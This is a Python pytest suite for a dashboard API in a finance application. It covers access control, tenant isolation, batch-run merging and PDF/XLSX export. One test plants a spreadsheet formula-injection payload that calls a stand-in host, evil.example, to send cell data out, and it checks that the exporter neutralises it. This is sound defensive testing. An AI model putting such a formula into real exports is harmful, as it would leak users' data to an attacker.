"""CR-034 §4 — Report Studio *Panolar* (dashboards) persistence + batch-run +
deck-export API guards.

Runs on the SQLite ``client`` + two-company ``seed`` fixtures (conftest), exactly
like ``test_cr033_reports_api``. Proves every §4 invariant:

* CRUD + soft-delete (a deleted pano is 404 / absent from the list);
* the private/company/cross-company visibility matrix (no existence leak) and the
  owner-or-director edit/delete matrix (private+stranger → 404, company+stranger →
  403);
* report-widget isolation — a ``report`` widget pointing at a deleted / another
  user's private / cross-company report degrades to ``{"unavailable": True}`` on
  ``/run``, never 500, never leaking the target report's title/spec, while a
  viewable report renders a real result;
* zero financial mutation — create + run + export write ONLY ``dashboards`` rows;
* spec validity — bad inner spec, WidgetSpec envelope violations and duplicate
  widget ids all → 422;
* **the batch-run global merge + FOUNDER OVERRIDE** — a data OR report widget that
  omits ``date_range``/``filters``/``comparison`` inherits the dashboard global;
  a widget that sets its own WINS (proven both via the computed totals AND the
  merged ``meta`` window that the engine echoes back);
* duplicate → a private copy owned by the caller with deep-copied widgets;
* deck export pdf/xlsx (csv → 422; an all-text / all-unavailable pano → a
  title-only pdf but xlsx → 422 NO_DATA);
* company_id/owner_id always come from auth, never the request body.

The ``@pytest.mark.pg`` WITH-CHECK tenant-isolation proof for ``dashboards`` lives
in ``test_rls_isolation_pg.py`` (env-gated; skips on SQLite).
"""
import io
from datetime import date
from decimal import Decimal

from sqlalchemy import func, select

from app.constants import (
    ROLE_DIRECTOR,
    ROLE_FINANCE,
    ROLE_PROJECT_MANAGER,
    ROLE_SITE_MANAGER,
)
from app.models.client_invoice import ClientInvoice
from app.models.cost_entry import CostEntry
from app.models.dashboard import Dashboard
from app.models.landowner_payment import LandownerPayment
from app.models.report import Report
from app.models.unit_sale import UnitSale

D = Decimal

BASE = "/api/v1/studio/dashboards"

SPEC_KPI = {"metrics": ["cost_try"], "viz": "kpi"}
SPEC_TABLE = {"metrics": ["cost_try"], "dimensions": ["project"], "viz": "table"}


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _login_director(client, seed, label="a"):
    client.login(seed[label]["users"][ROLE_DIRECTOR])
    return seed[label]["project"]


def _cost(db, p, amount, uid, d=date(2026, 1, 10), cat="material_steel"):
    amt = D(str(amount))
    db.add(CostEntry(
        project_id=p.id, company_id=p.company_id, entry_date=d, cost_category=cat,
        amount_try=amt, vat_amount_try=D("0"), total_with_vat_try=amt,
        payment_status="unpaid", entry_type="actual", created_by=uid,
    ))
    db.commit()


def _layout(x=0, y=0, w=6, h=4):
    return {"x": x, "y": y, "w": w, "h": h}


def _kpi(wid, *, spec=None, title="KPI", section=None):
    w = {"id": wid, "type": "kpi", "title": title, "layout": _layout(), "spec": spec or dict(SPEC_KPI)}
    if section is not None:
        w["section"] = section
    return w


def _table(wid, *, spec=None, title="Tablo"):
    return {"id": wid, "type": "table", "title": title, "layout": _layout(), "spec": spec or dict(SPEC_TABLE)}


def _text(wid, *, content="Serbest metin", title="Metin"):
    return {"id": wid, "type": "text", "title": title, "layout": _layout(), "content": content}


def _report_w(wid, report_id, *, title="Rapor widget"):
    return {"id": wid, "type": "report", "title": title, "layout": _layout(), "report_id": str(report_id)}


def _make_report(db, seed, label, owner_role, *, visibility="private", spec=None, title="Rapor",
                 deleted=False):
    owner = seed[label]["users"][owner_role]
    r = Report(
        company_id=seed[label]["company"].id, owner_id=owner.id, created_by=owner.id,
        title=title, spec=spec or dict(SPEC_TABLE), visibility=visibility,
    )
    if deleted:
        r.is_deleted = True
    db.add(r)
    db.commit()
    db.refresh(r)
    return r


def _make_dashboard(db, seed, label, owner_role, *, visibility="private", widgets=None,
                    title="Pano", date_range=None, comparison=None, filters=None):
    """Insert a Dashboard row directly for precise owner/visibility/widget control
    (the API create rejects report widgets pointing at unviewable reports, so the
    isolation cases can only be set up by a direct insert)."""
    owner = seed[label]["users"][owner_role]
    d = Dashboard(
        company_id=seed[label]["company"].id, owner_id=owner.id, created_by=owner.id,
        title=title, widgets=widgets or [], visibility=visibility,
        date_range=date_range, comparison=comparison, filters=filters,
    )
    db.add(d)
    db.commit()
    db.refresh(d)
    return d


def _count(db, model) -> int:
    db.rollback()  # drop any stale snapshot so we see rows the API committed
    return db.execute(select(func.count()).select_from(model)).scalar_one()


# --------------------------------------------------------------------------- #
# 1) CRUD + soft-delete
# --------------------------------------------------------------------------- #
def test_crud_happy_path_owner(client, seed):
    _login_director(client, seed, "a")

    c = client.post(BASE, json={
        "title": "İlk Pano", "widgets": [_kpi("w1"), _text("w2", content="not")],
        "date_range": {"preset": "bu_ay"}, "labels": ["genel"],
    })
    assert c.status_code == 200, c.text
    data = c.json()["data"]
    did = data["id"]
    assert data["is_owner"] is True
    assert data["visibility"] == "private"
    assert data["labels"] == ["genel"]
    assert len(data["widgets"]) == 2
    assert data["date_range"] == {"preset": "bu_ay"}

    g = client.get(f"{BASE}/{did}")
    assert g.status_code == 200 and g.json()["data"]["title"] == "İlk Pano"

    p = client.patch(f"{BASE}/{did}", json={
        "title": "Güncel", "visibility": "company", "widgets": [_kpi("w1")],
    })
    assert p.status_code == 200
    body = p.json()["data"]
    assert body["title"] == "Güncel" and body["visibility"] == "company"
    assert len(body["widgets"]) == 1

    lst = client.get(BASE).json()["data"]
    item = next(it for it in lst if it["id"] == did)
    assert item["widget_count"] == 1  # list returns a widget count, not the array

    d = client.delete(f"{BASE}/{did}")
    assert d.status_code == 200 and d.json()["data"]["deleted"] is True

    # Soft-delete hides it from the list and GET → 404.
    lst2 = client.get(BASE).json()["data"]
    assert all(it["id"] != did for it in lst2)
    assert client.get(f"{BASE}/{did}").status_code == 404


# --------------------------------------------------------------------------- #
# 2) Visibility / ownership matrix
# --------------------------------------------------------------------------- #
def test_private_invisible_to_same_company(client, seed, db):
    dash = _make_dashboard(db, seed, "a", ROLE_FINANCE, visibility="private", title="Gizli")

    client.login(seed["a"]["users"][ROLE_PROJECT_MANAGER])  # same company, not owner
    assert client.get(f"{BASE}/{dash.id}").status_code == 404
    lst = client.get(BASE).json()["data"]
    assert all(it["id"] != str(dash.id) for it in lst)

    client.login(seed["a"]["users"][ROLE_FINANCE])  # owner sees it
    assert client.get(f"{BASE}/{dash.id}").status_code == 200


def test_company_visible_to_all_same_company(client, seed, db):
    dash = _make_dashboard(db, seed, "a", ROLE_FINANCE, visibility="company", title="Paylaşılan")
    for role in (ROLE_DIRECTOR, ROLE_PROJECT_MANAGER, ROLE_FINANCE, ROLE_SITE_MANAGER):
        client.login(seed["a"]["users"][role])
        r = client.get(f"{BASE}/{dash.id}")
        assert r.status_code == 200, f"{role}: {r.text}"


def test_cross_company_never_leaks(client, seed, db):
    for vis in ("private", "company"):
        dash = _make_dashboard(db, seed, "a", ROLE_DIRECTOR, visibility=vis, title=f"A-{vis}")
        client.login(seed["b"]["users"][ROLE_DIRECTOR])
        assert client.get(f"{BASE}/{dash.id}").status_code == 404
        lst = client.get(BASE).json()["data"]
        assert all(it["id"] != str(dash.id) for it in lst)
        # run / export / duplicate are all 404 across the tenant boundary too.
        assert client.post(f"{BASE}/{dash.id}/run").status_code == 404
        assert client.post(f"{BASE}/{dash.id}/export?format=pdf").status_code == 404
        assert client.post(f"{BASE}/{dash.id}/duplicate").status_code == 404


def test_owner_director_edit_matrix(client, seed, db):
    dash = _make_dashboard(db, seed, "a", ROLE_FINANCE, visibility="company", title="Şirket Panosu")
    did = dash.id

    # PM — same company, non-owner, non-director → 403 on a COMPANY pano.
    client.login(seed["a"]["users"][ROLE_PROJECT_MANAGER])
    assert client.patch(f"{BASE}/{did}", json={"title": "X"}).status_code == 403
    assert client.delete(f"{BASE}/{did}").status_code == 403

    # Owner (finance) → 200.
    client.login(seed["a"]["users"][ROLE_FINANCE])
    assert client.patch(f"{BASE}/{did}", json={"title": "Sahip"}).status_code == 200

    # Director → 200 patch & delete (any company pano).
    client.login(seed["a"]["users"][ROLE_DIRECTOR])
    assert client.patch(f"{BASE}/{did}", json={"title": "Direktör"}).status_code == 200
    assert client.delete(f"{BASE}/{did}").status_code == 200


def test_private_stranger_gets_404_not_403(client, seed, db):
    """A private pano of another user must be INVISIBLE (404), never 403 — no
    existence leak — for GET/PATCH/DELETE."""
    dash = _make_dashboard(db, seed, "a", ROLE_FINANCE, visibility="private", title="Özel")
    client.login(seed["a"]["users"][ROLE_PROJECT_MANAGER])  # non-owner, non-director
    assert client.get(f"{BASE}/{dash.id}").status_code == 404
    assert client.patch(f"{BASE}/{dash.id}", json={"title": "X"}).status_code == 404
    assert client.delete(f"{BASE}/{dash.id}").status_code == 404


def test_director_edits_other_users_private_pano_same_company(client, seed, db):
    """'edit/delete = owner OR director': a director may edit another user's
    PRIVATE pano — but only within their own company."""
    dash = _make_dashboard(db, seed, "a", ROLE_FINANCE, visibility="private", title="Birinin özeli")
    client.login(seed["a"]["users"][ROLE_DIRECTOR])  # same-company director, not owner
    assert client.patch(f"{BASE}/{dash.id}", json={"title": "Direktör düzenledi"}).status_code == 200
    assert client.delete(f"{BASE}/{dash.id}").status_code == 200


def test_cross_company_edit_is_404(client, seed, db):
    """A company-B DIRECTOR cannot edit/delete a company-A pano (404, no leak)."""
    for vis in ("private", "company"):
        dash = _make_dashboard(db, seed, "a", ROLE_DIRECTOR, visibility=vis, title=f"A-{vis}")
        client.login(seed["b"]["users"][ROLE_DIRECTOR])
        assert client.patch(f"{BASE}/{dash.id}", json={"title": "X"}).status_code == 404
        assert client.delete(f"{BASE}/{dash.id}").status_code == 404


# --------------------------------------------------------------------------- #
# 3) Report-widget unavailable — never leaks, never 500
# --------------------------------------------------------------------------- #
def test_report_widget_unavailable_paths_never_leak(client, seed, db):
    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    _cost(db, p, "120000", uid)

    # (viewable) — owned by the dashboard owner (director) → renders a real result.
    rep_ok = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="private",
                          spec=dict(SPEC_TABLE), title="GORUNUR-RAPOR")
    # (a) soft-deleted report
    rep_del = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="company",
                           spec={"metrics": ["revenue"]}, title="SILINMIS-RAPOR", deleted=True)
    # (b) another user's PRIVATE report (same company)
    rep_priv = _make_report(db, seed, "a", ROLE_FINANCE, visibility="private",
                            spec={"metrics": ["pnl"]}, title="BASKASININ-OZELI")
    # (c) a CROSS-COMPANY report
    rep_cross = _make_report(db, seed, "b", ROLE_DIRECTOR, visibility="company",
                             spec={"metrics": ["budget"]}, title="B-SIRKETI-RAPORU")

    dash = _make_dashboard(
        db, seed, "a", ROLE_DIRECTOR, visibility="private", title="Karışık pano",
        widgets=[
            _report_w("w_ok", rep_ok.id),
            _report_w("w_del", rep_del.id),
            _report_w("w_priv", rep_priv.id),
            _report_w("w_cross", rep_cross.id),
        ],
    )

    run = client.post(f"{BASE}/{dash.id}/run")
    assert run.status_code == 200, run.text  # NEVER a 500
    res = run.json()["data"]

    # The viewable report renders a real result.
    assert "columns" in res["w_ok"] and "totals" in res["w_ok"]
    assert res["w_ok"]["totals"]["metrics"]["cost_try"] == 120000.0

    # Every unavailable target degrades to the exact status sentinel.
    for wid in ("w_del", "w_priv", "w_cross"):
        assert res[wid] == {"unavailable": True}, wid

    # No leak: neither the foreign report titles NOR their spec metric ids appear.
    blob = run.text
    for leak in ("SILINMIS-RAPOR", "BASKASININ-OZELI", "B-SIRKETI-RAPORU",
                 "revenue", "pnl", "budget"):
        assert leak not in blob, f"leaked: {leak!r}"


# --------------------------------------------------------------------------- #
# 4) No financial mutation
# --------------------------------------------------------------------------- #
def test_create_run_export_mutate_no_financial_rows(client, seed, db):
    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    _cost(db, p, "90000", uid)

    cost_before = _count(db, CostEntry)
    inv_before = _count(db, ClientInvoice)
    sale_before = _count(db, UnitSale)
    land_before = _count(db, LandownerPayment)
    rep_before = _count(db, Report)
    dash_before = _count(db, Dashboard)

    did = client.post(BASE, json={
        "title": "Mutasyon Yok",
        "widgets": [_kpi("k1"), _table("t1"), _text("x1")],
    }).json()["data"]["id"]
    assert client.post(f"{BASE}/{did}/run").status_code == 200
    assert client.post(f"{BASE}/{did}/export?format=pdf").status_code == 200
    assert client.post(f"{BASE}/{did}/export?format=xlsx").status_code == 200

    assert _count(db, CostEntry) == cost_before
    assert _count(db, ClientInvoice) == inv_before
    assert _count(db, UnitSale) == sale_before
    assert _count(db, LandownerPayment) == land_before
    assert _count(db, Report) == rep_before          # no report row touched
    assert _count(db, Dashboard) == dash_before + 1  # exactly one new pano row


# --------------------------------------------------------------------------- #
# 5) Spec validity 422 (inner spec, envelope, duplicate id)
# --------------------------------------------------------------------------- #
def test_create_bad_inner_spec_returns_422(client, seed):
    _login_director(client, seed, "a")
    r = client.post(BASE, json={"title": "Kötü", "widgets": [_kpi("w", spec={"metrics": ["nope"]})]})
    assert r.status_code == 422
    assert r.json()["error"]["code"] == "VALIDATION_ERROR"


def test_patch_bad_inner_spec_returns_422(client, seed, db):
    dash = _make_dashboard(db, seed, "a", ROLE_DIRECTOR, widgets=[_kpi("w")])
    client.login(seed["a"]["users"][ROLE_DIRECTOR])
    r = client.patch(f"{BASE}/{dash.id}", json={"widgets": [_kpi("w", spec={"metrics": []})]})
    assert r.status_code == 422
    assert r.json()["error"]["code"] == "VALIDATION_ERROR"


def test_create_report_widget_missing_report_id_422(client, seed):
    _login_director(client, seed, "a")
    bad = {"id": "w", "type": "report", "title": "R", "layout": _layout()}  # no report_id
    r = client.post(BASE, json={"title": "P", "widgets": [bad]})
    assert r.status_code == 422  # WidgetSpec envelope (Pydantic) → 422


def test_create_kpi_widget_carrying_content_422(client, seed):
    _login_director(client, seed, "a")
    bad = {"id": "w", "type": "kpi", "title": "K", "layout": _layout(),
           "spec": dict(SPEC_KPI), "content": "metin"}  # data widget must not carry content
    r = client.post(BASE, json={"title": "P", "widgets": [bad]})
    assert r.status_code == 422


def test_create_widget_two_payloads_422(client, seed):
    _login_director(client, seed, "a")
    bad = {"id": "w", "type": "kpi", "title": "K", "layout": _layout(),
           "spec": dict(SPEC_KPI), "report_id": "00000000-0000-0000-0000-000000000001"}
    r = client.post(BASE, json={"title": "P", "widgets": [bad]})
    assert r.status_code == 422


def test_create_duplicate_widget_id_422(client, seed):
    _login_director(client, seed, "a")
    r = client.post(BASE, json={"title": "P", "widgets": [_kpi("dup"), _table("dup")]})
    assert r.status_code == 422
    assert r.json()["error"]["code"] == "VALIDATION_ERROR"


def test_create_report_widget_unviewable_target_422(client, seed, db):
    """A report widget on CREATE must reference a report the creator can view."""
    rep = _make_report(db, seed, "a", ROLE_FINANCE, visibility="private", title="Başkasının")
    client.login(seed["a"]["users"][ROLE_DIRECTOR])  # not the owner; private → unviewable
    r = client.post(BASE, json={"title": "P", "widgets": [_report_w("w", rep.id)]})
    assert r.status_code == 422


def test_create_rejects_bad_visibility_422(client, seed):
    _login_director(client, seed, "a")
    r = client.post(BASE, json={"title": "Takım", "widgets": [], "visibility": "team"})
    assert r.status_code == 422


# --------------------------------------------------------------------------- #
# 6) Batch-run global merge + FOUNDER OVERRIDE (the key guard)
# --------------------------------------------------------------------------- #
def test_batch_run_global_date_range_merge_and_override(client, seed, db):
    """A kpi/report widget that OMITS date_range inherits the dashboard global;
    one that SETS its own keeps it (widget/own-spec wins). The report-widget
    inheritance OVERRIDES the saved report spec — proven both via the computed
    total AND the merged ``meta.date_range`` echoed by the engine."""
    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    _cost(db, p, "100000", uid, d=date(2026, 1, 10))  # January
    _cost(db, p, "50000", uid, d=date(2026, 3, 10))   # March

    rep_no_window = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="private",
                                 spec={"metrics": ["cost_try"]}, title="rep-no-window")
    rep_own_window = _make_report(db, seed, "a", ROLE_DIRECTOR, visibility="private",
                                  spec={"metrics": ["cost_try"],
                                        "date_range": {"from": "2026-01-01", "to": "2026-01-31"}},
                                  title="rep-own-window")

    march = {"from": "2026-03-01", "to": "2026-03-31"}
    jan = {"from": "2026-01-01", "to": "2026-01-31"}
    d_march = _make_dashboard(
        db, seed, "a", ROLE_DIRECTOR, title="Mart panosu", date_range=march,
        widgets=[
            _kpi("wk_inherit", spec={"metrics": ["cost_try"], "viz": "kpi"}),
            _kpi("wk_own", spec={"metrics": ["cost_try"], "viz": "kpi", "date_range": jan}),
            _report_w("wr_inherit", rep_no_window.id),
            _report_w("wr_own", rep_own_window.id),
        ],
    )
    res = client.post(f"{BASE}/{d_march.id}/run").json()["data"]

    # Data widget: omit → inherits March (50k); own → keeps January (100k).
    assert res["wk_inherit"]["totals"]["metrics"]["cost_try"] == 50000.0
    assert res["wk_inherit"]["meta"]["date_range"] == march
    assert res["wk_own"]["totals"]["metrics"]["cost_try"] == 100000.0
    assert res["wk_own"]["meta"]["date_range"] == jan

    # Report widget: the dashboard global OVERRIDES the saved report spec where the
    # report omits a window (50k, March); the report's OWN window wins where set
    # (100k, January). meta echoes exactly which window each ran under.
    assert res["wr_inherit"]["totals"]["metrics"]["cost_try"] == 50000.0
    assert res["wr_inherit"]["meta"]["date_range"] == march
    assert res["wr_own"]["totals"]["metrics"]["cost_try"] == 100000.0
    assert res["wr_own"]["meta"]["date_range"] == jan

    # Control: with NO global, the same widgets see ALL costs (150k) — confirms the
    # 50k above came from the global flowing in, not the report/widget default.
    d_none = _make_dashboard(
        db, seed, "a", ROLE_DIRECTOR, title="Globalsiz pano", date_range=None,
        widgets=[
            _kpi("wk2", spec={"metrics": ["cost_try"], "viz": "kpi"}),
            _report_w("wr2", rep_no_window.id),
        ],
    )
    res2 = client.post(f"{BASE}/{d_none.id}/run").json()["data"]
    assert res2["wk2"]["totals"]["metrics"]["cost_try"] == 150000.0
    assert res2["wr2"]["totals"]["metrics"]["cost_try"] == 150000.0


def test_batch_run_global_filters_merge_and_override(client, seed, db):
    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    _cost(db, p, "100000", uid, cat="material_steel")
    _cost(db, p, "50000", uid, cat="material_steel")
    _cost(db, p, "70000", uid, cat="material_concrete")

    steel = [{"field": "cost_category", "op": "=", "value": "material_steel"}]
    concrete = [{"field": "cost_category", "op": "=", "value": "material_concrete"}]
    dash = _make_dashboard(
        db, seed, "a", ROLE_DIRECTOR, title="Filtre panosu", filters=steel,
        widgets=[
            _kpi("wf_inherit", spec={"metrics": ["cost_try"], "viz": "kpi"}),
            _kpi("wf_own", spec={"metrics": ["cost_try"], "viz": "kpi", "filters": concrete}),
        ],
    )
    res = client.post(f"{BASE}/{dash.id}/run").json()["data"]
    # Inherit the global steel filter (150k, concrete excluded — not 220k).
    assert res["wf_inherit"]["totals"]["metrics"]["cost_try"] == 150000.0
    # Own concrete filter wins (70k).
    assert res["wf_own"]["totals"]["metrics"]["cost_try"] == 70000.0


def test_batch_run_global_comparison_flows_in(client, seed, db):
    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    _cost(db, p, "100000", uid, d=date(2026, 1, 10))

    dash = _make_dashboard(
        db, seed, "a", ROLE_DIRECTOR, title="Karşılaştırma panosu",
        date_range={"from": "2026-01-01", "to": "2026-01-31"},
        comparison={"preset": "previous_period"},
        widgets=[_kpi("wc", spec={"metrics": ["cost_try"], "viz": "kpi"})],
    )
    res = client.post(f"{BASE}/{dash.id}/run").json()["data"]
    # The global comparison flows into the widget (previous period = December).
    assert res["wc"]["meta"]["comparison"] == {"from": "2025-12-01", "to": "2025-12-31"}
    assert res["wc"]["totals"]["deltas"] is not None


def test_run_text_only_widget_is_omitted_from_batch(client, seed):
    _login_director(client, seed, "a")
    did = client.post(BASE, json={"title": "Metin", "widgets": [_text("t1")]}).json()["data"]["id"]
    res = client.post(f"{BASE}/{did}/run").json()["data"]
    assert res == {}  # text widgets carry no data → absent from the batch result


# --------------------------------------------------------------------------- #
# 7) Duplicate → private copy owned by caller, widgets deep-copied
# --------------------------------------------------------------------------- #
def test_duplicate_creates_private_copy_owned_by_caller(client, seed, db):
    dash = _make_dashboard(db, seed, "a", ROLE_DIRECTOR, visibility="company",
                           title="Kaynak", widgets=[_kpi("w1", title="Orijinal başlık")],
                           date_range={"preset": "bu_ay"})
    pm = seed["a"]["users"][ROLE_PROJECT_MANAGER]
    client.login(pm)

    d = client.post(f"{BASE}/{dash.id}/duplicate")
    assert d.status_code == 200, d.text
    copy = d.json()["data"]
    assert copy["title"].endswith("(kopya)")
    assert copy["visibility"] == "private"
    assert copy["is_owner"] is True
    assert copy["owner_id"] == str(pm.id)
    assert copy["id"] != str(dash.id)
    assert copy["date_range"] == {"preset": "bu_ay"}
    assert copy["widgets"][0]["title"] == "Orijinal başlık"

    # Deep copy: editing the copy must not bleed into the source.
    patched = [_kpi("w1", title="Kopya değişti")]
    assert client.patch(f"{BASE}/{copy['id']}", json={"widgets": patched}).status_code == 200
    client.login(seed["a"]["users"][ROLE_DIRECTOR])  # source owner
    src = client.get(f"{BASE}/{dash.id}").json()["data"]
    assert src["widgets"][0]["title"] == "Orijinal başlık"  # untouched


# --------------------------------------------------------------------------- #
# 8) Export — pdf/xlsx non-empty; csv → 422; all-text/all-unavailable
# --------------------------------------------------------------------------- #
def test_export_pdf_and_xlsx_and_csv_rejected(client, seed, db):
    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    _cost(db, p, "120000", uid)

    did = client.post(BASE, json={
        "title": "Dışa Aktar", "widgets": [_kpi("k1", title="Toplam Maliyet"),
                                           _table("t1", title="Maliyet tablosu"),
                                           _text("x1", content="not")],
    }).json()["data"]["id"]

    pdf = client.post(f"{BASE}/{did}/export?format=pdf")
    assert pdf.status_code == 200
    assert pdf.headers["content-type"].startswith("application/pdf")
    assert pdf.content[:4] == b"%PDF" and len(pdf.content) > 100

    xlsx = client.post(f"{BASE}/{did}/export?format=xlsx")
    assert xlsx.status_code == 200
    assert "spreadsheetml" in xlsx.headers["content-type"]
    assert xlsx.content[:2] == b"PK"  # zip container

    # One sheet per DATA widget (kpi + table = 2); the text widget gets none.
    from openpyxl import load_workbook
    wb = load_workbook(io.BytesIO(xlsx.content))
    assert len(wb.sheetnames) == 2

    csv_r = client.post(f"{BASE}/{did}/export?format=csv")
    assert csv_r.status_code == 422  # csv is the per-report export, not a deck
    assert csv_r.json()["error"]["code"] == "INVALID_FORMAT"

    bad = client.post(f"{BASE}/{did}/export?format=xml")
    assert bad.status_code == 422


def test_export_xlsx_carries_the_data(client, seed, db):
    from openpyxl import load_workbook

    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    _cost(db, p, "120000", uid)
    did = client.post(BASE, json={
        "title": "İçerik", "widgets": [_table("t1", title="Maliyet")],
    }).json()["data"]["id"]

    xlsx = client.post(f"{BASE}/{did}/export?format=xlsx")
    ws = load_workbook(io.BytesIO(xlsx.content)).active
    vals = [c for row in ws.iter_rows(values_only=True) for c in row]
    assert "Toplam" in vals
    assert 120000 in vals or 120000.0 in vals


def test_export_text_only_pano_pdf_ok_xlsx_no_data(client, seed):
    _login_director(client, seed, "a")
    did = client.post(BASE, json={
        "title": "Sadece metin", "widgets": [_text("x1", content="Yalnızca açıklama")],
    }).json()["data"]["id"]

    pdf = client.post(f"{BASE}/{did}/export?format=pdf")
    assert pdf.status_code == 200  # title-only deck — never an error
    assert pdf.content[:4] == b"%PDF" and len(pdf.content) > 100

    xlsx = client.post(f"{BASE}/{did}/export?format=xlsx")
    assert xlsx.status_code == 422  # no data sheet → NO_DATA
    assert xlsx.json()["error"]["code"] == "NO_DATA"


def test_export_all_unavailable_pano_pdf_ok_xlsx_no_data(client, seed, db):
    p = _login_director(client, seed, "a")
    _cost(db, p, "10000", seed["a"]["users"][ROLE_DIRECTOR].id)
    rep_cross = _make_report(db, seed, "b", ROLE_DIRECTOR, visibility="company",
                             title="B-only", spec={"metrics": ["cost_try"]})
    dash = _make_dashboard(db, seed, "a", ROLE_DIRECTOR, title="Hep kullanılamaz",
                           widgets=[_report_w("w_cross", rep_cross.id)])
    client.login(seed["a"]["users"][ROLE_DIRECTOR])

    pdf = client.post(f"{BASE}/{dash.id}/export?format=pdf")
    assert pdf.status_code == 200 and pdf.content[:4] == b"%PDF"

    xlsx = client.post(f"{BASE}/{dash.id}/export?format=xlsx")
    assert xlsx.status_code == 422
    assert xlsx.json()["error"]["code"] == "NO_DATA"


def test_export_xlsx_neutralizes_formula_injection(client, seed, db):
    """CSV/formula injection: a user-authored dimension value beginning with a
    formula trigger (= + - @) must NOT become a live formula in the exported xlsx.
    The deck holds only the exporter's own company data, but dimension labels are
    user-authored (here a planted ``cost_category``), so a director opening the file
    could otherwise trigger ``=WEBSERVICE(...)``-style exfiltration. The cell must be
    rendered as literal text (apostrophe-prefixed), never a formula."""
    from openpyxl import load_workbook

    p = _login_director(client, seed, "a")
    uid = seed["a"]["users"][ROLE_DIRECTOR].id
    payload = '=WEBSERVICE("http://evil.example/?x="&A1)'
    _cost(db, p, "1000", uid, cat=payload)

    did = client.post(BASE, json={
        "title": "Enjeksiyon",
        "widgets": [_table("wt", spec={"metrics": ["cost_try"],
                                       "dimensions": ["cost_category"], "viz": "table"})],
    }).json()["data"]["id"]

    xlsx = client.post(f"{BASE}/{did}/export?format=xlsx")
    assert xlsx.status_code == 200
    ws = load_workbook(io.BytesIO(xlsx.content)).active
    cells = [c.value for row in ws.iter_rows() for c in row if isinstance(c.value, str)]

    # The planted value reached the sheet (so the guard had something to neutralize)…
    assert any("WEBSERVICE" in v for v in cells)
    # …but it is neutralized: no live formula cell, nothing begins with a trigger, and
    # the payload survives only in apostrophe-prefixed literal-text form.
    assert all(c.data_type != "f" for row in ws.iter_rows() for c in row)
    assert not any(v[:1] in ("=", "+", "-", "@") for v in cells)
    assert any(v.startswith("'=WEBSERVICE") for v in cells)


def test_safe_cell_unit():
    """The shared formula-guard helper prefixes only text cells starting with a
    trigger; numbers (incl. negatives passed natively), empties and benign strings
    pass through untouched."""
    from app.services.studio.export import _safe_cell

    for bad in ("=cmd", "+cmd", "-cmd", "@cmd", "\tcmd", "\rcmd"):
        assert _safe_cell(bad) == "'" + bad
    assert _safe_cell("Çelik") == "Çelik"
    assert _safe_cell("") == ""
    assert _safe_cell(1000) == 1000
    assert _safe_cell(-5.0) == -5.0  # native negative number is NOT formula-prefixed


# --------------------------------------------------------------------------- #
# 9) company_id / owner_id always from auth, never the body
# --------------------------------------------------------------------------- #
def test_create_ignores_foreign_company_and_owner_in_body(client, seed, db):
    director_a = seed["a"]["users"][ROLE_DIRECTOR]
    client.login(director_a)

    c = client.post(BASE, json={
        "title": "Sahiplik",
        "widgets": [_kpi("w1")],
        # Hostile body fields that MUST be ignored:
        "company_id": str(seed["b"]["company"].id),
        "owner_id": str(seed["b"]["users"][ROLE_DIRECTOR].id),
    })
    assert c.status_code == 200, c.text
    data = c.json()["data"]
    assert data["owner_id"] == str(director_a.id)  # the caller, not the body

    # The persisted row is scoped to the caller's company, never company B.
    row = db.execute(select(Dashboard).where(Dashboard.id == data["id"])).scalar_one()
    assert row.company_id == seed["a"]["company"].id
    assert row.owner_id == director_a.id
